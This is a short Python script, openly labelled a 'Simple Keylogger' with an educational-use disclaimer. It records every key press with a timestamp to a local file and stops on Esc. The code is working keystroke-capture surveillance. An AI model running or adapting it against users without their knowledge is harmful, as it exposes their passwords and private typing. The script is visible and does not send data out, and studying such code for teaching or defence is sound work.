from pynput.keyboard import Key, Listener
import logging

# Set up logging to file
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        # Stop listener on 'Esc'
        return False

def main():
    print("--- Simple Keylogger ---")
    print("Disclaimer: This tool is for educational purposes only.")
    print("Press 'Esc' to stop logging.")
    
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
